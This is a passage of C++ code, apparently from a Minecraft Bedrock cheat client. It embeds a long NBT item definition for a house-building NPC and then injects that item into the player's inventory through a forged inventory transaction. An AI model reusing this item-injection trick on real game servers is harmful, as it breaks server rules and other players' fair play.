"cmd_ver":12
},
{
"cmd_line":"fill\t~-14\t~\t~3\t~-14\t~\t~3\tquartz_stairs\t4",
"cmd_ver":12
},)";
			std::string tag3 = R"(
{
"cmd_line":"fill\t~-17\t~3\t~3\t~-14\t~2\t~3\tspruce_trapdoor\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-17\t~1\t~3\t~-14\t~1\t~3\tchest\t3",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-17\t~\t~3\t~-15\t~\t~3\tstone_slab\t14",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-21\t~6\t~2\t~-8\t~9\t~2\tconcrete\t0\treplace\tair",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-20\t~8\t~2\t~-11\t~7\t~2\tair\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-11\t~6\t~2\t~-12\t~6\t~2\tair\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-18\t~6\t~6\t~-16\t~6\t~6\tconcrete\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-19\t~6\t~5\t~-15\t~6\t~7\tiron_trapdoor\t4\treplace\tair",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-19\t~7\t~5\t~-15\t~7\t~7\tcarpet\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-20\t~6\t~6\t~-20\t~6\t~6\tstone_slab\t6",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-18\t~6\t~8\t~-18\t~6\t~8\tstone_slab\t6",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~6\t~8\t~-16\t~6\t~8\tstone_slab\t6",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-14\t~6\t~6\t~-14\t~6\t~6\tstone_slab\t6",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-8\t~6\t~4\t~-8\t~6\t~6\tlit_smoker\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-8\t~6\t~3\t~-8\t~6\t~8\tstone_slab\t14\treplaceair",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-9\t~6\t~8\t~-10\t~6\t~8\tstone_slab\t14",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-8\t~7\t~4\t~-8\t~7\t~6\theavy_weighted_pressure_plate\t1",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-8\t~7\t~8\t~-10\t~7\t~8\tspruce_trapdoor\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-8\t~8\t~8\t~-10\t~8\t~8\tchest\t2",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-8\t~9\t~8\t~-10\t~9\t~8\tspruce_trapdoor\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-11\t~6\t~8\t~-11\t~6\t~8\tquartz_stairs\t5",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-8\t~7\t~3\t~-8\t~7\t~3\tflower_pot\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-11\t~7\t~8\t~-11\t~7\t~8\tflower_pot\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-7\t~12\t~-1\t~-7\t~12\t~-1\tquartz_stairs\t6",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~12\t~15\t~-16\t~12\t~15\tquartz_stairs\t6",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~12\t~15\t~-22\t~12\t~15\tquartz_stairs\t6",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~12\t~3\t~-22\t~12\t~3\tquartz_stairs\t6",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~12\t~-8\t~-16\t~12\t~-8\tquartz_stairs\t6",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-7\t~12\t~2\t~-7\t~12\t~2\tquartz_stairs\t7",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~12\t~9\t~-16\t~12\t~9\tquartz_stairs\t7",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~12\t~9\t~-22\t~12\t~9\tquartz_stairs\t7",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~12\t~-2\t~-22\t~12\t~-2\tquartz_stairs\t7",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~12\t~-14\t~-16\t~12\t~-14\tquartz_stairs\t7",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-7\t~11\t~\t~-7\t~11\t~1\tcampfire\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-7\t~12\t~\t~-7\t~12\t~1\tsmoker\t4",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-10\t~12\t~6\t~-10\t~12\t~6\tquartz_block\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-11\t~12\t~5\t~-9\t~12\t~7\tiron_trapdoor\t4\treplace\tair",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-10\t~13\t~6\t~-10\t~15\t~6\tfence\t2",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-10\t~16\t~6\t~-10\t~16\t~6\tquartz_block\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-11\t~13\t~5\t~-9\t~13\t~7\tcarpet\t0\treplace\tair",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-12\t~16\t~4\t~-8\t~16\t~8\tstone_slab\t6\treplace\tair",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-8\t~12\t~6\t~-8\t~12\t~6\tstone_slab\t6",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-12\t~12\t~6\t~-12\t~12\t~6\tstone_slab\t6",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-10\t~12\t~4\t~-10\t~12\t~4\tstone_slab\t6",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-10\t~12\t~8\t~-10\t~12\t~8\tstone_slab\t6",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~12\t~10\t~-16\t~12\t~14\tstone_slab\t14",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~12\t~10\t~-22\t~12\t~14\tstone_slab\t14",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~12\t~2\t~-22\t~12\t~-1\tstone_slab\t14",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~12\t~-13\t~-16\t~12\t~-9\tstone_slab\t14",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~11\t~-6\t~-22\t~11\t~-15\tquartz_block\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-18\t~11\t~-9\t~-21\t~11\t~-14\twater\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~13\t~12\t~-16\t~13\t~12\tlantern\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~13\t~12\t~-22\t~13\t~12\tlantern\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~13\t~3\t~-22\t~13\t~3\tlantern\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~13\t~-2\t~-22\t~13\t~-2\tlantern\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~13\t~-11\t~-16\t~13\t~-11\tlantern\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~13\t~10\t~-16\t~13\t~14\tchest\t4\treplace\tair",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~11\t~-11\t~-16\t~11\t~-11\tjukebox\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~11\t~-9\t~-16\t~11\t~-13\tchest\t4\treplace\tquartz_block",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~13\t~10\t~-22\t~13\t~14\tchest\t5\treplace\tair",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~11\t~2\t~-22\t~11\t~-1\tchest\t5\treplace\tplanks",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~13\t~\t~-22\t~13\t~1\tbrewing_stand\t0",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~13\t~9\t~-16\t~13\t~15\tflower_pot\t0\treplace\tair",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-22\t~13\t~9\t~-22\t~13\t~15\tflower_pot\t0\treplace\tair",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~13\t~-8\t~-16\t~13\t~-14\tflower_pot\t0\treplace\tair",
"cmd_ver":12
},
{
"cmd_line":"fill\t~-16\t~14\t~9\t~-16\t~15\t~15\tspruce_trapdoor\t3","cmd_ver":12},{"cmd_line":"fill\t~-16\t~14\t~-8\t~-16\t~15\t~-14\tspruce_trapdoor\t3","cmd_ver":12},{"cmd_line":"fill\t~-22\t~14\t~9\t~-22\t~15\t~15\tspruce_trapdoor\t3","cmd_ver":12},{"cmd_line":"fill\t~-22\t~14\t~3\t~-22\t~15\t~-2\tspruce_trapdoor\t3","cmd_ver":12},{"cmd_line":"fill\t~-19\t~12\t~16\t~-19\t~12\t~16\tlectern\t2","cmd_ver":12},{"cmd_line":"fill\t~-16\t~15\t~-6\t~-20\t~12\t~-6\tstained_glass\t15","cmd_ver":12}],"mode":0,"text":"fill\t~-8\t~\t~9\t~-22\t~4\t~-8\tconcrete\t0","type":1}]",Armor:[{Count:0b,Damage:0s,Name:"",WasPickedUp:0b},{Count:0b,Damage:0s,Name:"",WasPickedUp:0b},{Count:0b,Damage:0s,Name:"",WasPickedUp:0b},{Count:0b,Damage:0s,Name:"",WasPickedUp:0b}],AttackTime:0s,Attributes:[{Base:16f,Current:16f,DefaultMax:2048f,DefaultMin:0f,Max:2048f,Min:0f,Name:"minecraft:follow_range"},{Base:0f,Current:0f,DefaultMax:1024f,DefaultMin:-1024f,Max:1024f,Min:-1024f,Name:"minecraft:luck"},{Base:0.02f,Current:0.02f,DefaultMax:"3.4028235E38f",DefaultMin:0f,Max:"3.4028235E38f",Min:0f,Name:"minecraft:lava_movement"},{Base:0.02f,Current:0.02f,DefaultMax:"3.4028235E38f",DefaultMin:0f,Max:"3.4028235E38f",Min:0f,Name:"minecraft:underwater_movement"},{Base:0.5f,Current:0.5f,DefaultMax:"3.4028235E38f",DefaultMin:0f,Max:"3.4028235E38f",Min:0f,Name:"minecraft:movement"},{Base:0f,Current:0f,DefaultMax:1f,DefaultMin:0f,Max:1f,Min:0f,Name:"minecraft:knockback_resistance"},{Base:0f,Current:0f,DefaultMax:16f,DefaultMin:0f,Max:16f,Min:0f,Name:"minecraft:absorption"},{Base:20f,Current:20f,DefaultMax:"3.4028235E38f",DefaultMin:0f,Max:"3.4028235E38f",Min:0f,Name:"minecraft:health"}],BodyRot:-111.861f,Chested:0b,Color:0b,Color2:0b,CustomName:"NRG's NG House NPC",CustomNameVisible:1b,Dead:0b,DeathTime:0s,FallDistance:0f,Fire:0s,HurtTime:0s,InterativeText:"Click build to build idiot",Invulnerable:0b,IsAngry:0b,IsAutonomous:0b,IsBaby:0b,IsEating:0b,IsGliding:0b,IsGlobal:0b,IsIllagerCaptain:0b,IsOrphaned:0b,IsOutOfControl:0b,IsPregnant:0b,IsRoaring:0b,IsScared:0b,IsStunned:0b,IsSwimming:0b,IsTamed:0b,IsTrusting:0b,LastDimensionId:0,LeasherID:-1l,LootDropped:0b,Mainhand:[{Count:0b,Damage:0s,Name:"",WasPickedUp:0b}],MarkVariant:0,NaturalSpawn:0b,Offhand:[{Count:0b,Damage:0s,Name:"",WasPickedUp:0b}],OnGround:1b,OwnerNew:-1l,Persistent:1b,PortalCooldown:0,Pos:[66.0602f,64f,-4.13513f],Rawtext:"§5 Gamemodes by Maridjan7",Rotation:[0f,25.7197f],Saddled:0b,Sheared:0b,ShowBottom:0b,Sitting:0b,SkinID:0,Strength:0,StrengthMax:0,Surface:0b,Tags:[],TargetID:-1l,TradeExperience:0,TradeTier:0,UniqueID:-64424509410l,Variant:19,boundX:0,boundY:0,boundZ:0,canPickupItems:0b,definitions:["+minecraft:npc"],hasBoundOrigin:0b,hasSetCanPickupItems:1b,identifier:"minecraft:npc",limitedLife:0},TicksLeftToStay:1}],display:{Lore:["Â§rÂ§lÂ§4NG House Builder"],Name:"Â§rÂ§lÂ§cNG House"}}})";
			yot->fromTag(*Mojangson::parseTag(tag1 + tag2 + tag3));
			g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, yot, nullptr, 1, 507, 99999));
			g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(yot);
			if (partner->Partnered.selected == 0)
				clientMessageF("%sDADDY%s%s%s[%sSurge%s] %sHere is your CBEP!%s%sDADDY", OBFUSCATED, RESET, ITALIC, BOLD, BLUE, WHITE, BLUE, RESET, OBFUSCATED);
			else
				clientMessageF("[%sNG%s] %sHere is your CBEP!", LIGHT_PURPLE, WHITE, LIGHT_PURPLE);
			return true;
		}
	}
}